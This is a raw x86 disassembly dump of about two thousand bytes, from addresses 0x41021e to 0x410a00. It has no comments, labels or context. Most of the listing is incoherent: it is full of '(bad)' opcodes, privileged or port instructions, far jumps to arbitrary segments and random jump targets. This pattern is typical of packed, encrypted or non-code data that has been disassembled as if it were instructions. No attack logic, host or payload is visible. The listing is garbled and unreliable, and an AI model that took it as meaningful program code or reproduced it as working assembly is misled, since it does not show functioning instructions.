  41021e:	jb     0x4101c5
  410220:	pop    eax
  410221:	repnz pop edx
  410223:	cdq    
  410224:	mov    DWORD PTR [edx+0x74],ecx
  410227:	push   ebx
  410228:	les    ebp,FWORD PTR [edx+edi*2]
  41022b:	popf   
  41022c:	inc    esp
  41022d:	repnz inc edx
  41022f:	mov    cl,0x88
  410231:	dec    esp
  410232:	cmp    eax,0x894434dd
  410237:	jb     0x4101f6
  410239:	adc    ebp,DWORD PTR [ebx+0x402b8602]
  41023f:	add    eax,0xd8ee03e9
  410244:	(bad)  
  410245:	call   0x573ee8c
  41024a:	repnz inc esp
  41024c:	cmp    al,0x35
  41024e:	add    eax,DWORD PTR [ecx+eiz*1]
  410251:	sub    ebp,DWORD PTR [eax*1-0x3a45fc17]
  410258:	aam    0x2
  41025a:	jne    0x41025e
  41025c:	jmp    0xee42ece1
  410261:	xchg   DWORD PTR [eax*1+0x3e9],ebx
  410268:	add    BYTE PTR [eax],al
  41026a:	add    BYTE PTR [esi-0x9fb8330],cl
  410270:	fs cld 
  410272:	xor    al,0xc3
  410274:	push   DWORD PTR [esi]
  410276:	adc    DWORD PTR [esi],esi
  410278:	xor    edx,0x9
  41027b:	sub    eax,ebp
  41027d:	fld    QWORD PTR [ebp+0x34e533f4]
  410283:	imul   DWORD PTR [esp+ebp*8]
  410286:	mov    ch,0x85
  410288:	adc    edx,0x6
  41028b:	or     ebx,esp
  41028d:	addr16 cmp ecx,esi
  410290:	add    ch,cl
  410292:	add    esi,DWORD PTR [edx-0x7b]
  410295:	dec    esp
  410296:	xor    DWORD PTR [ebx+0x2f],edi
  410299:	imul   esi,DWORD PTR [ebp+0x7ede02d2],0x34a533d4
  4102a3:	arpl   bp,ax
  4102a5:	hlt    
  4102a6:	cli    
  4102a7:	mov    cl,0x16
  4102a9:	pop    ss
  4102aa:	inc    esp
  4102ab:	pop    ebp
  4102ac:	mov    ch,0xea
  4102ae:	add    esi,DWORD PTR [ebp-0x15]
  4102b1:	es test al,0xc7
  4102b4:	and    BYTE PTR [eax-0x8],ch
  4102b7:	ins    BYTE PTR es:[edi],dx
  4102b8:	mov    ch,0xff
  4102ba:	jg     0x4102f1
  4102bc:	sbb    al,0xe5
  4102be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102bf:	jmp    0x4102d3
  4102c1:	add    ecx,ebp
  4102c3:	jbe    0x4102c7
  4102c5:	and    DWORD PTR [ecx+0x77],0xffffffff
  4102c9:	mov    esi,DWORD PTR [ecx+0x12000274]
  4102cf:	add    BYTE PTR [eax],al
  4102d1:	add    BYTE PTR [eax],al
  4102d3:	add    BYTE PTR [ebx],ah
  4102d5:	fwait
  4102d6:	push   cs
  4102d7:	push   0x36
  4102d9:	xor    edi,esi
  4102db:	ds jno 0x410356
  4102de:	adc    ch,BYTE PTR [edx-0x21f7d70b]
  4102e4:	push   0xffffffe1
  4102e6:	repnz es test eax,0x71c9f984
  4102ed:	xchg   BYTE PTR [eax],bl
  4102ef:	sbb    cl,BYTE PTR [ecx+0x56138030]
  4102f5:	das    
  4102f6:	(bad)  
  4102f7:	jmp    0xfa4d8975
  4102fc:	xchg   BYTE PTR [eax],dh
  4102fe:	(bad)  
  4102ff:	lods   al,BYTE PTR ds:[esi]
  410300:	sub    cl,0x44
  410303:	aad    0xe0
  410305:	cmp    eax,0x27b09e8
  41030a:	add    BYTE PTR [esi-0x16feed54],ah
  410310:	jbe    0x410314
  410312:	adc    ecx,0x70
  410315:	dec    DWORD PTR [ebx+0x278d9]
  41031b:	add    ah,BYTE PTR [edi-0x5e95f166]
  410321:	xor    dh,bh
  410323:	scas   al,BYTE PTR es:[edi]
  410324:	jbe    0x41039a
  410326:	adc    ch,BYTE PTR [edx]
  410328:	cli    
  410329:	sub    ecx,DWORD PTR [eax]
  41032b:	adc    eax,0xc9f98180
  410330:	or     bh,dl
  410332:	adc    BYTE PTR [ebx+0xfe2dd1],0x0
  410339:	add    BYTE PTR [eax],al
  41033b:	add    BYTE PTR [eax],al
  41033d:	dec    esp
  41033e:	add    DWORD PTR [ebp-0x20e4133],eax
  410344:	jmp    DWORD PTR [ecx+0xa]
  410347:	cmp    DWORD PTR [ebp+0x40],eax
  41034a:	je     0x41031f
  41034c:	jmp    0x410afd
  410351:	push   ebx
  410352:	cmp    edx,DWORD PTR [edx]
  410354:	add    DWORD PTR [edx+eax*1],ebx
  410357:	add    BYTE PTR [ebx-0x73f0f85c],al
  41035d:	pop    esp
  41035e:	pop    es
  41035f:	add    BYTE PTR [eax],al
  410361:	ja     0x4103b3
  410363:	push   0xf
  410365:	pop    edi
  410366:	sahf   
  410367:	icebp  
  410368:	call   FWORD PTR [ebx+0xf13b601]
  41036e:	test   eax,edi
  410370:	or     bh,al
  410372:	or     al,BYTE PTR [ebx-0x71ff2606]
  410378:	xchg   ebp,eax
  410379:	outs   dx,BYTE PTR ds:[esi]
  41037a:	icebp  
  41037b:	std    
  41037c:	xor    DWORD PTR [esi+0x7b],0xccfffe
  410383:	test   BYTE PTR [ecx-0x20f52],cl
  410389:	rcl    DWORD PTR ds:0x73a04539,1
  41038f:	iret   
  410390:	jmp    0x4109ad
  410395:	jecxz  0x4103d1
  410397:	adc    al,BYTE PTR [ecx]
  410399:	pushf  
  41039a:	add    DWORD PTR [eax],eax
  41039c:	xor    DWORD PTR [esi+eax*1+0x8c0f],0x0
  4103a4:	add    BYTE PTR [eax],al
  4103a6:	or     BYTE PTR [esi],al
  4103a8:	add    BYTE PTR [eax],al
  4103aa:	addr16 push ebx
  4103ac:	push   0xf
  4103ae:	fbstp  TBYTE PTR [ebp-0xf]
  4103b1:	call   FWORD PTR [ebx]
  4103b3:	add    BYTE PTR [esi-0x77a70ed],dh
  4103b9:	or     dh,BYTE PTR [ebp+0x24]
  4103bc:	jle    0x410413
  4103be:	inc    edi
  4103bf:	jl     0x4103f2
  4103c1:	cmp    BYTE PTR [edi],0x36
  4103c4:	mov    al,0xb
  4103c6:	hlt    
  4103c7:	add    BYTE PTR [edi+0x11b32ff],0x85
  4103ce:	mov    al,0xa9
  4103d0:	xor    esi,edi
  4103d2:	and    bl,BYTE PTR [esi+0x16]
  4103d5:	cmp    DWORD PTR [eax+0x1cd0b037],esi
  4103db:	jae    0x4103e0
  4103dd:	add    BYTE PTR [ebp+0x8],dh
  4103e0:	push   esi
  4103e1:	inc    ecx
  4103e2:	in     al,dx
  4103e3:	lea    edx,[esi]
  4103e5:	cmp    esi,DWORD PTR [edi]
  4103e7:	sbb    al,0x7e
  4103e9:	dec    ecx
  4103ea:	je     0x410407
  4103ec:	add    ch,bl
  4103ee:	jbe    0x410418
  4103f0:	push   esp
  4103f1:	inc    ecx
  4103f2:	sahf   
  4103f3:	inc    ebp
  4103f4:	sahf   
  4103f5:	push   cs
  4103f6:	imul   BYTE PTR [eax-0x1]
  4103f9:	push   DWORD PTR [ebp+0x24]
  4103fc:	js     0x410408
  4103fe:	(bad)  
  4103ff:	je     0x4103f7
  410401:	mov    DWORD PTR [ecx+0x4a],esi
  410404:	lds    edi,FWORD PTR [edi-0x2c]
  410407:	add    DWORD PTR es:[ebp+0x0],eax
  41040e:	add    BYTE PTR [ecx+ebp*1+0x30],bh
  410412:	(bad)  
  410413:	stos   BYTE PTR es:[edi],al
  410414:	gs push ss
  410416:	cmp    DWORD PTR [eax],edi
  410418:	das    
  410419:	mov    al,0xd8
  41041b:	mov    WORD PTR [ecx],es
  41041d:	add    eax,DWORD PTR [eax]
  41041f:	jne    0x410429
  410421:	push   esi
  410422:	inc    ecx
  410423:	cld    
  410424:	cmc    
  410425:	pop    ss
  410426:	cmp    esi,DWORD PTR [edi+0x740d7e33]
  41042c:	sbb    eax,DWORD PTR [edx]
  41042e:	jmp    0x4104a6
  410430:	sub    BYTE PTR [ecx+eax*2-0x52],dl
  410434:	sti    
  410435:	lahf   
  410436:	push   cs
  410437:	test   BYTE PTR [edx],0xff
  41043a:	(bad)  
  41043b:	pop    edx
  41043c:	sub    al,0xed
  41043e:	jns    0x4104bf
  410440:	ja     0x410480
  410442:	clc    
  410443:	cld    
  410444:	(bad)  
  410445:	test   esp,0xec21c2
  41044b:	icebp  
  41044c:	cmp    eax,0x2c333177
  410451:	sub    ebx,DWORD PTR [eax]
  410453:	ins    BYTE PTR es:[edi],dx
  410454:	(bad)
  410457:	cmp    eax,0x7504431a
  41045c:	add    bl,BYTE PTR [edx]
  41045e:	push   esi
  41045f:	mov    ah,0x79
  410461:	mov    ebx,0xdd404e17
  410466:	jg     0x41048c
  410468:	add    ebp,ecx
  41046a:	add    ecx,DWORD PTR [esi]
  41046c:	add    dl,bh
  41046e:	push   ebp
  41046f:	xor    al,0xe7
  410471:	xchg   esi,eax
  410472:	lahf   
  410473:	add    BYTE PTR [eax],al
  410475:	add    BYTE PTR [eax],al
  410477:	add    BYTE PTR [ebx+0x7f],bh
  41047a:	adc    al,BYTE PTR [eax]
  41047c:	jne    0x410480
  41047e:	idiv   BYTE PTR [ecx+0x6f]
  410481:	ja     0x410439
  410483:	idiv   esp
  410485:	(bad)  
  410486:	test   esp,0xe7214a
  41048c:	clc    
  41048d:	xchg   ecx,eax
  41048e:	div    DWORD PTR [eax]
  410490:	mov    ebx,0x6c17a32b
  410495:	(bad)
  410498:	int    0x19
  41049a:	inc    edi
  41049b:	add    al,0x75
  41049d:	add    bl,BYTE PTR [edx]
  41049f:	push   esi
  4104a0:	xor    al,0x79
  4104a2:	xor    ebx,DWORD PTR [eax]
  4104a4:	dec    esi
  4104a5:	inc    eax
  4104a6:	in     eax,0x7f
  4104a8:	loopne 0x4104ac
  4104aa:	jmp    0xfa4092b2
  4104af:	push   ebp
  4104b0:	xor    al,0xe7
  4104b2:	push   ds
  4104b3:	mov    al,ds:0x56ff7f83
  4104b8:	push   0x2b
  4104ba:	(bad)  
  4104bb:	(bad)  
  4104bd:	clc    
  4104be:	mov    bh,BYTE PTR [edi]
  4104c0:	pop    ebp
  4104c1:	jns    0x4104ce
  4104c3:	clc    
  4104c4:	cmp    DWORD PTR [ebx-0x798a1720],ebp
  4104ca:	push   esp
  4104cb:	cwde   
  4104cc:	test   DWORD PTR [esi+edi*8],ebp
  4104cf:	sub    al,0x5d
  4104d1:	jmp    0x4a25da1a
  4104d6:	jmp    0x60:0x41512001
  4104dd:	add    BYTE PTR [eax],al
  4104df:	add    BYTE PTR [eax],al
  4104e1:	dec    ebx
  4104e2:	(bad)  
  4104e4:	sub    ecx,edx
  4104e6:	mov    eax,ds:0x5109eaea
  4104eb:	inc    ecx
  4104ec:	adc    ah,BYTE PTR [edi]
  4104ee:	xchg   edi,eax
  4104ef:	push   cs
  4104f0:	push   0xffffffdf
  4104f2:	idiv   bh
  4104f4:	call   0x724b796e
  4104f9:	int3   
  4104fa:	out    dx,al
  4104fb:	mov    ebp,esp
  4104fd:	xchg   DWORD PTR [edi-0x479b781],edi
  410503:	test   cl,cl
  410505:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410506:	sub    al,0xfe
  410508:	push   ds
  410509:	mov    ebx,0x62ac390e
  41050e:	lods   al,BYTE PTR ds:[esi]
  41050f:	fadd   DWORD PTR [edx]
  410511:	leave  
  410512:	out    dx,eax
  410513:	shr    DWORD PTR [ebx-0x3dec29c1],1
  410519:	cmp    BYTE PTR [edi-0x108efdd5],ah
  41051f:	shr    DWORD PTR [ebx-0x994336f],1
  410525:	imul   esi
  410527:	or     ebp,ecx
  410529:	jbe    0x410526
  41052b:	mov    ch,0xe2
  41052d:	pmullw mm6,QWORD PTR [ebx]
  410530:	arpl   WORD PTR [ebp+0x11],si
  410533:	inc    ebx
  410534:	add    BYTE PTR [eiz*8+0xdd80f0e],cl
  41053b:	out    dx,eax
  41053c:	jmp    DWORD PTR [ebx]
  41053e:	fiadd  DWORD PTR [ebx+0x14]
  410541:	cmp    edx,DWORD PTR gs:[edx]
  410544:	jle    0x410546
  410546:	add    BYTE PTR [eax],al
  410548:	add    BYTE PTR [eax],al
  41054a:	xor    eax,0x57f84bae
  41054f:	mov    edi,0xdb72840d
  410554:	std    
  410555:	dec    edi
  410557:	jae    0x410543
  410559:	add    BYTE PTR [ebx+0x7b],al
  41055c:	nop
  41055d:	or     eax,0x558b061c
  410562:	test   al,0x85
  410564:	sar    dl,0x95
  410567:	push   ebx
  410568:	cli    
  410569:	adc    DWORD PTR [esi+0x15870d29],0x3
  410570:	add    BYTE PTR [eax],al
  410572:	mov    ds:0xf63931a,eax
  410577:	aas    
  410578:	dec    BYTE PTR [eax-0x3ec4ee37]
  41057e:	xor    DWORD PTR [esi-0x77],ebx
  410581:	inc    esi
  410582:	mov    al,0x1c
  410584:	(bad)  
  410585:	jae    0x410592
  410587:	test   DWORD PTR [eax+ebx*1-0x34],edi
  41058b:	jno    0x4105a5
  41058d:	push   0xffffffdc
  41058f:	fdiv   DWORD PTR [eax+ebx*1+0x57]
  410593:	out    0x8b,al
  410595:	push   esi
  410596:	shr    BYTE PTR [ecx+eax*8-0x1b31518],1
  41059d:	call   FWORD PTR [ecx]
  41059f:	mov    esi,0x43175673
  4105a4:	imul   bl
  4105a6:	mov    cl,0xac
  4105a8:	push   esp
  4105a9:	sbb    al,0x87
  4105ab:	les    edi,FWORD PTR [ecx]
  4105ad:	fadd   DWORD PTR [eax]
  4105af:	add    BYTE PTR [eax],al
  4105b1:	add    BYTE PTR [eax],al
  4105b3:	sub    ecx,DWORD PTR [edx]
  4105b5:	mov    al,BYTE PTR [ebx]
  4105b7:	jne    0x4105ce
  4105b9:	(bad)  
  4105ba:	sub    ecx,DWORD PTR [eax]
  4105bc:	inc    esi
  4105bd:	cmp    ecx,0x89efe774
  4105c3:	mov    dh,0x1a
  4105c5:	call   0xf8289e0f
  4105ca:	inc    edx
  4105cb:	(bad)  
  4105cc:	ficom  WORD PTR [edi]
  4105ce:	cmp    DWORD PTR [eax+0x5eb2ae27],ebp
  4105d4:	push   edx
  4105d5:	fld    st(7)
  4105d7:	(bad)  
  4105d8:	fcomp  DWORD PTR [edi+0x5144258a]
  4105de:	cmp    ch,BYTE PTR [edi]
  4105e0:	sub    DWORD PTR [ebp-0x3b4bb276],esp
  4105e6:	jnp    0x4105d8
  4105e8:	pop    edx
  4105e9:	mov    dh,0x12
  4105eb:	pop    esi
  4105ec:	idiv   bl
  4105ee:	jne    0x41065b
  4105f0:	or     al,0x3d
  4105f2:	inc    eax
  4105f3:	cld    
  4105f4:	pop    eax
  4105f5:	into   
  4105f6:	cmp    dh,BYTE PTR [eax+eiz*1]
  4105f9:	jge    0x410663
  4105fb:	add    al,0xb8
  4105fd:	sub    eax,0x2eb7882
  410602:	psubb  mm3,mm4
  410605:	es (bad) 
  410607:	jmp    0xe19d:0x72fbcf33
  41060e:	out    dx,eax
  41060f:	fcmovu st,st(7)
  410611:	jns    0x410657
  410613:	cdq    
  410614:	pop    ebx
  410615:	jnp    0x41065b
  410617:	add    BYTE PTR [eax],al
  410619:	add    BYTE PTR [eax],al
  41061b:	add    BYTE PTR [ecx-0x11dc47f0],dl
  410621:	out    dx,eax
  410622:	cwde   
  410623:	(bad)  
  410624:	mov    ebx,0xbe8b0ea5
  410629:	daa    
  41062a:	mov    dh,0x17
  41062c:	inc    ebx
  41062d:	xor    BYTE PTR [esi-0x1525df1],dh
  410633:	(bad)  
  410634:	and    BYTE PTR [edx],al
  410636:	icebp  
  410637:	sbb    ebp,DWORD PTR [ecx]
  410639:	push   ds
  41063a:	(bad)  ds:0xfda87f3f
  410640:	stc    
  410641:	int    0xde
  410643:	add    esi,DWORD PTR [ebp-0x13]
  410646:	and    esi,DWORD PTR [eax]
  410648:	out    0x4e,eax
  41064a:	iret   
  41064b:	sbb    DWORD PTR [ebx+0x28],ebx
  41064e:	mov    ch,0x1
  410650:	cmp    al,0x1c
  410652:	ja     0x4106cf
  410654:	mov    cl,0xe
  410656:	loop   0x41069a
  410658:	rcr    DWORD PTR [ecx+esi*2-0x3a],1
  41065c:	fsubp  st(3),st
  41065e:	mov    al,0xb1
  410660:	in     eax,dx
  410661:	not    DWORD PTR [esi+0x11]
  410664:	imul   BYTE PTR [ebx+esi*8]
  410667:	mov    dh,0x7e
  410669:	ret    
  41066a:	ror    DWORD PTR [ebx-0x59],0x90
  41066e:	push   0xc4ad6ce9
  410673:	sbb    BYTE PTR [ebp-0x7d],dl
  410676:	(bad)  
  410677:	cli    
  410678:	xchg   BYTE PTR [esi],al
  41067a:	push   0xffffffae
  41067c:	stos   BYTE PTR es:[edi],al
  41067d:	add    bl,ah
  41067f:	xchg   DWORD PTR [eax],eax
  410681:	add    BYTE PTR [eax],al
  410683:	add    BYTE PTR [eax],al
  410685:	imul   DWORD PTR [ecx+eiz*8]
  410688:	mov    bh,0x65
  41068a:	add    DWORD PTR [edx+0x0],0x69
  41068e:	mul    BYTE PTR [edi+0x2a]
  410691:	icebp  
  410692:	add    ch,cl
  410694:	add    esi,DWORD PTR [edx+0x7d]
  410697:	mov    esi,0xa927db2c
  41069c:	sub    al,0x39
  41069e:	push   cs
  41069f:	loopne 0x41065f
  4106a1:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106a3:	push   esi
  4106a4:	sbb    esp,DWORD PTR [edx]
  4106a6:	daa    
  4106a7:	or     eax,0x94c87f2d
  4106ac:	cld    
  4106ad:	mul    ebp
  4106af:	std    
  4106b0:	sub    al,0xab
  4106b2:	idiv   edi
  4106b4:	test   BYTE PTR ds:[ebx-0x7c661f07],al
  4106bb:	dec    edx
  4106bc:	out    0x61,al
  4106be:	sub    BYTE PTR [edx-0x7c07691d],al
  4106c4:	sub    edx,DWORD PTR [eax+0x28]
  4106c7:	(bad)  
  4106c8:	push   0xe8ff874c
  4106cd:	jbe    0x4106c6
  4106cf:	xor    edi,0xffffff99
  4106d2:	sub    dh,bh
  4106d4:	sub    bh,BYTE PTR [ecx]
  4106d6:	in     al,dx
  4106d7:	shr    BYTE PTR ds:0xa62a1ac1,0xa1
  4106de:	sub    BYTE PTR [edx],bh
  4106e0:	aas    
  4106e1:	adc    eax,0x91e182f8
  4106e6:	sub    dh,bh
  4106e8:	fiadd  WORD PTR [eax]
  4106ea:	add    BYTE PTR [eax],al
  4106ec:	add    BYTE PTR [eax],al
  4106ee:	rcl    BYTE PTR [ebx+eax*4],0x83
  4106f2:	das    
  4106f3:	mov    bl,0x10
  4106f5:	push   0x5c
  4106f7:	pop    es
  4106f8:	je     0x4106df
  4106fa:	imul   DWORD PTR [eax]
  4106fc:	lahf   
  4106fd:	jmp    0x6c500978
  410702:	movaps xmm7,xmm6
  410705:	pop    esi
  410706:	xor    eax,0xd2283ae7
  41070b:	dec    esi
  41070c:	call   0xfe694f60
  410711:	add    al,bl
  410713:	call   0x36fe:0x253d6a0e
  41071a:	loope  0x410788
  41071c:	adc    ch,BYTE PTR [edx-0x74]
  41071f:	stc    
  410720:	push   cs
  410721:	ins    DWORD PTR es:[edi],dx
  410722:	outs   dx,DWORD PTR ds:[esi]
  410723:	and    eax,0x28f51efe
  410728:	or     ah,dh
  41072a:	cli    
  41072b:	inc    esi
  41072c:	std    
  41072d:	push   cs
  41072e:	mov    DWORD PTR [ecx+edi*8-0x7dda5800],eax
  410735:	xlat   BYTE PTR ds:[ebx]
  410736:	stos   BYTE PTR es:[edi],al
  410737:	(bad)  
  410739:	and    DWORD PTR [esi+0x7a840d24],0xffffffd5
  410740:	std    
  410741:	call   FWORD PTR ds:0x9c0083d8
  410747:	add    cl,BYTE PTR [edi]
  410749:	test   dh,cl
  41074b:	(bad)  
  41074d:	dec    DWORD PTR [edi+0x3e]
  410750:	cmp    ecx,eax
  410752:	add    BYTE PTR [eax],al
  410754:	add    BYTE PTR [eax],al
  410756:	add    BYTE PTR [eax+0x2ab7e798],bh
  41075c:	(bad)  
  41075e:	cmp    ecx,DWORD PTR [edx-0x3f7cf276]
  410764:	fdivr  st,st(5)
  410766:	dec    DWORD PTR [ebx-0x4c]
  410769:	adc    DWORD PTR [ebx+0x1b722516],eax
  41076f:	iret   
  410770:	aam    0x9
  410772:	je     0x4107b6
  410774:	jge    0x41076e
  410776:	or     al,0x30
  410778:	jae    0xa972178
  41077e:	and    DWORD PTR [esi+0xcfffe83],0x9a8b8329
  410788:	fscale 
  41078a:	inc    ebx
  41078b:	fcom   QWORD PTR [edi+edi*4]
  41078e:	jl     0x4107ea
  410790:	pop    es
  410791:	jg     0x410791
  410793:	stos   DWORD PTR es:[edi],eax
  410794:	fld    DWORD PTR [edi-0x40eb2fbb]
  41079a:	mulps  xmm6,XMMWORD PTR [ebx-0x4]
  41079e:	jmp    FWORD PTR [ebx-0x4493a3eb]
  4107a4:	jl     0x4107f6
  4107a6:	(bad)  
  4107a7:	(bad)  ds:0x54a4dfb6
  4107ae:	xor    al,0x75
  4107b0:	add    eax,0x44711000
  4107b5:	jg     0x410812
  4107b7:	mov    bl,0xfc
  4107b9:	sub    al,BYTE PTR [edx+0x0]
  4107bc:	add    BYTE PTR [eax],al
  4107be:	add    BYTE PTR [eax],al
  4107c0:	stos   BYTE PTR es:[edi],al
  4107c1:	pop    esi
  4107c2:	push   cs
  4107c3:	cmp    DWORD PTR [eax],esi
  4107c5:	inc    edi
  4107c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107c7:	fisttp QWORD PTR [ebp+eax*4-0x4d6d01d8]
  4107ce:	mov    edi,0xf95a4e13
  4107d3:	mov    WORD PTR [esi],?
  4107d5:	dec    ebp
  4107d6:	sub    esi,edi
  4107d8:	ds aad 0x97
  4107db:	push   cs
  4107dc:	idiv   dl
  4107de:	sub    esi,edi
  4107e0:	push   0x14
  4107e2:	jo     0x4107e6
  4107e4:	out    dx,al
  4107e5:	add    al,0xf0
  4107e7:	cmc    
  4107e8:	jno    0x410835
  4107ea:	dec    BYTE PTR [esi]
  4107ec:	stc    
  4107ed:	push   eax
  4107ee:	sub    dh,bh
  4107f0:	dec    edx
  4107f1:	fsubr  DWORD PTR [edx]
  4107f3:	inc    esp
  4107f4:	imul   edx,DWORD PTR [edx-0x49],0x1b55b913
  4107fb:	sbb    esi,DWORD PTR [ebx]
  4107fd:	jl     0x410828
  4107ff:	mov    BYTE PTR [eax+0x72c0ed4f],dh
  410805:	sahf   
  410806:	adc    edi,esi
  410808:	sbb    dl,BYTE PTR [ebp+ebp*8-0x7ad35ea3]
  41080f:	in     eax,dx
  410810:	or     ah,al
  410812:	sub    DWORD PTR [esi],ecx
  410814:	retf   
  410815:	pop    ss
  410816:	jge    0x41086d
  410818:	inc    ecx
  410819:	int    0xfe
  41081b:	pcmpeqb mm5,QWORD PTR [edi+edi*2]
  41081f:	imul   eax
  410821:	jecxz  0x41084c
  410823:	inc    edx
  410824:	add    BYTE PTR [eax],al
  410826:	add    BYTE PTR [eax],al
  410828:	add    dl,ah
  41082a:	push   ebp
  41082b:	push   cs
  41082c:	cmp    DWORD PTR [eax],ebp
  41082e:	dec    edi
  41082f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410830:	fstp   st(4)
  410832:	add    DWORD PTR [ebx],edx
  410834:	sub    bl,cl
  410836:	and    al,0x6f
  410838:	shl    BYTE PTR [esi-0x17],0x27
  41083c:	cli    
  41083d:	jmp    0xb36b1386
  410842:	call   0x81bc9fed
  410847:	cmp    al,0x28
  410849:	mov    ds:0x7771e524,eax
  41084e:	jns    0x4107e6
  410850:	out    dx,eax
  410851:	mov    ch,bh
  410853:	clc    
  410854:	add    bh,BYTE PTR [edx+0x7e]
  410857:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410858:	daa    
  410859:	and    DWORD PTR [ecx+ebp*1],0x29
  41085d:	xor    DWORD PTR [esi],ecx
  41085f:	adc    BYTE PTR [edi+0x1ba6a686],dh
  410865:	and    ah,BYTE PTR [esi]
  410867:	mov    ebp,0xdcbded29
  41086c:	in     al,dx
  41086d:	xor    eax,0x51575bf4
  410872:	and    al,0xa5
  410874:	in     eax,dx
  410875:	test   al,0x96
  410877:	in     eax,dx
  410878:	test   ah,ch
  41087a:	and    eax,0x6c6b2995
  41087f:	jmp    0x7f2fd100
  410884:	add    BYTE PTR [ebp+0x67eee12],al
  41088a:	es jne 0x4108b6
  41088d:	add    BYTE PTR [eax],al
  41088f:	add    BYTE PTR [eax],al
  410891:	add    BYTE PTR [edi+0x4c102323],dh
  410897:	mov    ch,0xfc
  410899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41089a:	sub    BYTE PTR [edx],bl
  41089c:	data16 daa 
  41089e:	add    esp,DWORD PTR [edi+ebx*2]
  4108a1:	mov    edi,0xf927e766
  4108a6:	add    DWORD PTR [eax-0x1814d6bd],ebp
  4108ac:	sahf   
  4108ad:	xchg   edi,eax
  4108ae:	jae    0x41092f
  4108b0:	call   DWORD PTR [eax-0x2101db6d]
  4108b6:	inc    esp
  4108b7:	add    BYTE PTR [ebx+0x32ddabf],cl
  4108bd:	stc    
  4108be:	repz or WORD PTR [ebx-0x5501db6d],0x5d
  4108c7:	mov    esi,0xfe3c013
  4108cc:	jl     0x4108ed
  4108ce:	jle    0x41089f
  4108d0:	cld    
  4108d1:	test   BYTE PTR [ebp-0xc],0xb5
  4108d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108d6:	xchg   edx,eax
  4108d7:	hlt    
  4108d8:	mov    ch,0x36
  4108da:	mov    al,BYTE PTR [edx-0x21]
  4108dd:	icebp  
  4108de:	add    DWORD PTR [edx-0x74],0xeaff7455
  4108e5:	fisubr WORD PTR [ebp+0x6d]
  4108e8:	inc    esi
  4108e9:	call   0xeb8f765b
  4108ee:	mov    bh,0x43
  4108f0:	pop    es
  4108f1:	loop   0x4108aa
  4108f3:	add    al,bh
  4108f5:	imul   eax,DWORD PTR [eax],0x0
  4108fb:	pop    ebp
  4108fc:	iret   
  4108fd:	jae    0x410894
  4108ff:	outs   dx,DWORD PTR ds:[esi]
  410900:	nop
  410901:	jecxz  0x4108a1
  410903:	(bad)  
  410904:	hlt    
  410905:	mov    ch,0x26
  410907:	jo     0x4108fc
  410909:	mov    ch,0x36
  41090b:	jne    0x41094e
  41090d:	loopne 0x410900
  41090f:	sub    DWORD PTR [ecx],edi
  410911:	mov    BYTE PTR [eiz*2-0x234d3700],ch
  410918:	push   cs
  410919:	minps  xmm3,XMMWORD PTR [ebx]
  41091c:	add    BYTE PTR [eax],al
  41091e:	jmp    0xdda13414
  410923:	(bad)  
  410924:	cmp    eax,DWORD PTR [ecx+ecx*1+0x73]
  410928:	add    al,BYTE PTR [eax]
  41092a:	jmp    0xc3bdc0
  41092f:	mov    ecx,0x25eafe1e
  410934:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410935:	inc    ebx
  410936:	and    al,0xc
  410938:	dec    edi
  410939:	std    
  41093a:	jne    0x4109b8
  41093c:	sub    DWORD PTR [edi+eax*1+0xf1a5493],esi
  410943:	sub    cl,BYTE PTR [edi-0xf38cda]
  410949:	(bad)  
  41094a:	jne    0x4108f0
  41094c:	std    
  41094d:	(bad)  
  41094e:	push   esi
  41094f:	jae    0x4109a5
  410951:	push   cs
  410952:	mov    esp,DWORD PTR [edi-0x26]
  410955:	jae    0x410963
  410957:	mov    ds:0xe7e80654,eax
  41095c:	(bad)  
  41095e:	inc    DWORD PTR [eax]
  410960:	add    BYTE PTR [eax],al
  410962:	add    BYTE PTR [eax],al
  410964:	sbb    DWORD PTR [esi-0x39ef48e],edi
  41096a:	sti    
  41096b:	jmp    DWORD PTR [ebx+0x5754832a]
  410971:	push   es
  410972:	add    BYTE PTR [edi],cl
  410974:	jmp    0x59:0xea0eff61
  41097b:	shr    DWORD PTR [edi+ebx*1],0x9
  41097f:	rcr    DWORD PTR [edi-0x12],0xd
  410983:	mov    dh,0x9b
  410985:	pop    es
  410986:	movzx  edx,BYTE PTR [ebx+0x54e0c104]
  41098d:	sbb    eax,0x2e4080bf
  410992:	push   edx
  410993:	je     0x41094d
  410995:	test   DWORD PTR [ebx+0x20],edi
  410998:	or     al,0x19
  41099a:	and    DWORD PTR [edx+0xf00060f],0x4a
  4109a1:	and    DWORD PTR ds:0x713e9cb6,ecx
  4109a7:	inc    eax
  4109a8:	or     al,0x5
  4109aa:	clc    
  4109ab:	jmp    0x410a22
  4109ad:	popa   
  4109ae:	jns    0x410a04
  4109b0:	mov    DWORD PTR [ebp+0x0],eax
  4109b3:	jmp    DWORD PTR [eax+0x27]
  4109b6:	and    eax,0x25797d74
  4109bb:	je     0x410942
  4109bd:	fdiv   DWORD PTR [eax-0x5a92df5]
  4109c3:	out    0xcd,eax
  4109c5:	or     esp,DWORD PTR [edi]
  4109c7:	inc    BYTE PTR [eax]
  4109c9:	add    BYTE PTR [eax],al
  4109cb:	add    BYTE PTR [eax],al
  4109cd:	clc    
  4109ce:	jmp    0x4109c6
  4109d0:	test   BYTE PTR [ebp-0x1fffddb],bh
  4109d6:	mov    fs,edx
  4109d8:	jmp    0x76ee:0x23b8945e
  4109df:	push   cs
  4109e0:	inc    ecx
  4109e1:	inc    esp
  4109e2:	jnp    0x410a09
  4109e4:	je     0x410a57
  4109e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109e7:	cmp    bh,dh
  4109e9:	add    BYTE PTR [ebx],dh
  4109eb:	int3   
  4109ec:	dec    BYTE PTR [eax]
  4109ee:	sbb    esp,DWORD PTR ds:0xaf386974
  4109f4:	pop    es
  4109f5:	pop    ebp
  4109f6:	fs and bh,dh
  4109f9:	push   0xffffffae
  4109fb:	inc    edx
  4109fc:	push   cs
  4109fd:	clc    
  4109fe:	push   ebx
  4109ff:	clc    
  410a00:	call   FWORD PTR [edx-0x54]
